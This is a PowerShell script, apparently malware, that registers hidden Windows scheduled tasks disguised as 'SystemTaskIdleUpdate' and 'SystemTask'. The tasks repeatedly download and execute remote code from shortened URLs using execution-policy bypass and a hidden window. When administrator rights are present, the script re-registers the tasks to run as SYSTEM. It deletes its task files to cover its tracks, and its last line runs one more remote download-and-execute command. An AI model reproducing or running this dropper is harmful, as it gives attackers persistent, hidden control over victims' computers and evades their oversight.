#
#SystemTaskIdleUpdate 'http://goo.gl/MTekjk', Temprorary when Idle
#

$f=$env:TEMP;$f+='\SystemTaskIdleUpdate.xml';
$s = '<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2010-10-16T16:09:29</Date>
    <Author>';
$s+=$env:username+'</Author>
  </RegistrationInfo>
  <Triggers>
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>';
$computername=$env:userdomain; if([string]::IsNullOrEmpty($computername)){$computername = $env:computername;};      
$s+=$computername+'\'+$env:username+'</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT15M</Duration>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>true</RestartOnIdle>
      <WaitTimeout>PT0S</WaitTimeout>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>true</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT8H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell</Command>';
$s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://goo.gl/MTekjk')</Arguments>";
$s+='</Exec>
  </Actions>
</Task>';

$s > $f;
schtasks.exe /Create /XML $env:TEMP"\SystemTaskIdleUpdate.xml" /tn "SystemTaskIdleUpdate";

$s = '';
$s > $f;

#
#destruct disk file
#

del $env:TEMP"\SystemTaskIdleUpdate.xml";

#
# if -NOT "Administrator"
#
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
  
  #
  # if Invoke-CheckLocalAdmin == $true
  #

  if(($(whoami /groups) -like "*S-1-5-32-544*").length -ne 0) {
  
    #
    # Priveleges: Invoke-BypassUAC (my command)
    #

    

    
    
      

  }
  
  

}

# else
#
# if "Administrator"
#
If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{

  #
  #SystemTask 'http://bit.ly/1RMFM6u', \ru System
  #

  $f=$env:TEMP;$f+='\SystemTask.xml';
  $s = '<?xml version="1.0" encoding="UTF-16"?>
  <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
      <Date>2010-10-16T16:09:29</Date>
      <Author>';
  $s+=$env:username+'</Author>
    </RegistrationInfo>
    <Triggers>
      <TimeTrigger>
        <Repetition>
          <Interval>PT3H</Interval>
          <StopAtDurationEnd>false</StopAtDurationEnd>
        </Repetition>
        <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
        <StartBoundary>2015-10-16T23:59:00</StartBoundary>
        <Enabled>true</Enabled>
      </TimeTrigger>
    </Triggers>
    <Principals>
      <Principal id="Author">
        <UserId>';
  $s+='S-1-5-18'+'</UserId>
        <LogonType>InteractiveToken</LogonType>
        <RunLevel>LeastPrivilege</RunLevel>
      </Principal>
    </Principals>
    <Settings>
      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
      <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
      <AllowHardTerminate>true</AllowHardTerminate>
      <StartWhenAvailable>true</StartWhenAvailable>
      <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
      <IdleSettings>
        <StopOnIdleEnd>false</StopOnIdleEnd>
        <RestartOnIdle>false</RestartOnIdle>
      </IdleSettings>
      <AllowStartOnDemand>true</AllowStartOnDemand>
      <Enabled>true</Enabled>
      <Hidden>true</Hidden>
      <RunOnlyIfIdle>false</RunOnlyIfIdle>
      <WakeToRun>false</WakeToRun>
      <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
      <Priority>7</Priority>
    </Settings>
    <Actions Context="Author">
      <Exec>
        <Command>powershell</Command>';
  $s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1RMFM6u')</Arguments>";
  $s+='</Exec>
    </Actions>
  </Task>';

  $s > $f;
  schtasks.exe /Create /XML $env:TEMP"\SystemTask.xml" /tn "SystemTask" /ru System;

  $s = '';
  $s > $f;

  #
  #SystemTaskIdleUpdate to \ru System
  #

  $f=$env:TEMP;$f+='\SystemTaskIdleUpdate.xml';
  $s = '<?xml version="1.0" encoding="UTF-16"?>
  <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
      <Date>2010-10-16T16:09:29</Date>
      <Author>';
  $s+=$env:username+'</Author>
    </RegistrationInfo>
    <Triggers>
      <IdleTrigger>
        <Enabled>true</Enabled>
      </IdleTrigger>
    </Triggers>
    <Principals>
      <Principal id="Author">
        <UserId>';   
  $s+='S-1-5-18'+'</UserId>
        <LogonType>InteractiveToken</LogonType>
        <RunLevel>LeastPrivilege</RunLevel>
      </Principal>
    </Principals>
    <Settings>
      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
      <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
      <AllowHardTerminate>true</AllowHardTerminate>
      <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
      <IdleSettings>
        <Duration>PT15M</Duration>
        <StopOnIdleEnd>true</StopOnIdleEnd>
        <RestartOnIdle>true</RestartOnIdle>
        <WaitTimeout>PT0S</WaitTimeout>
      </IdleSettings>
      <AllowStartOnDemand>true</AllowStartOnDemand>
      <Enabled>true</Enabled>
      <Hidden>true</Hidden>
      <RunOnlyIfIdle>true</RunOnlyIfIdle>
      <WakeToRun>false</WakeToRun>
      <ExecutionTimeLimit>PT8H</ExecutionTimeLimit>
      <Priority>7</Priority>
    </Settings>
    <Actions Context="Author">
      <Exec>
        <Command>powershell</Command>';
  $s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://goo.gl/MTekjk')</Arguments>";
  $s+='</Exec>
    </Actions>
  </Task>';

  $s > $f;
  schtasks.exe /Delete /F /tn "SystemTaskIdleUpdate"; 
  schtasks.exe /Create /XML $env:TEMP"\SystemTaskIdleUpdate.xml" /tn "SystemTaskIdleUpdate" /ru System;

  $s = '';
  $s > $f;

  #
  #destruct disk files
  #
  
  del $env:TEMP"\SystemTaskIdleUpdate.xml";
  del $env:TEMP"\SystemTask.xml";

  #
  #end
  #

}

#
# MessageBox
#

iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1Mx7L5A');
